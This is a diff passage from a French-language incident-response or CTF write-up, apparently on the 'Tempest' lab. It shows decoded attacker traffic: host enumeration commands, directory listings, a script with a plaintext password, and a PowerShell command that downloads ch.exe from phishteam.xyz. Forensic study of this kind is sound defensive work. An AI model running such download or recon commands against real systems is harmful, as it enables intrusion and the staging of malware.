@@ -28,3 +28,99 @@ On utilise la commande donné pour récupérer les requetes : _path=="http" "res
 
 On décode ensuite les requetes en base64 afin de décoder le trafic :
 
+```
+whoami - tempest\benimaru
+pwd - 
+Path               
+----               
+C:\Windows\system32
+
+
+dir C:\Users - 
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name                                                                   
+----                -------------         ------ ----                                                                   
+d-----        6/20/2022   9:06 PM                benimaru                                                               
+d-r---        6/20/2022   4:03 PM                Public                                                                 
+d-----        6/20/2022  11:52 PM                rimuru                                                                 
+
+
+net users - 
+User accounts for \\TEMPEST
+
+-------------------------------------------------------------------------------
+Administrator            benimaru                 DefaultAccount           
+Guest                    rimuru                   WDAGUtilityAccount       
+The command completed successfully.
+
+net localgroup administrators - Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+rimuru
+The command completed successfully.
+
+net localgroup administrators - Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+rimuru
+The command completed successfully.
+
+net localgroup administrators - Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+rimuru
+The command completed successfully.
+
+dir C:\Users\benimaru\documents - dir C:\users\benimaru\Desktop - 
+
+    Directory: C:\users\benimaru\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                   
+----                -------------         ------ ----                                                                   
+-a----        6/20/2022  11:34 PM            268 automation.ps1                                                         
+-a----        6/20/2022   4:13 PM           1446 Microsoft Edge.lnk                                                     
+
+
+cat C:\Users\Benimaru\Desktop\automation.ps1 - $user = "TEMPEST\benimaru"
+$pass = "infernotempest"
+
+$securePassword = ConvertTo-SecureString $pass -AsPlainText -Force;
+$credential = New-Object System.Management.Automation.PSCredential $user, $securePassword
+
+## TODO: Automate easy tasks to hack working hours
+cat C:\Users\Benimaru\Desktop\automation.ps1 - $user = "TEMPEST\benimaru"
+$pass = "infernotempest"
+
+$securePassword = ConvertTo-SecureString $pass -AsPlainText -Force;
+$credential = New-Object System.Management.Automation.PSCredential $user, $securePassword
+
+## TODO: Automate easy tasks to hack working hours
+powershell iwr http://phishteam.xyz/02dcf07/ch.exe -outfile C:\Users\benimaru\Downloads\ch.exe - dir C:\Users\benimaru\Downloads\ch.exe - 
+
+    Directory: C:\Users\benimaru\Downloads
+
+
+Mode                LastWriteTime         Length Name                                                                   
+----                -------------         ------ ----                                                                   
+-a----        6/21/2022   1:17 AM        8230912 ch.exe                                                                 
+
+
+
+```
+
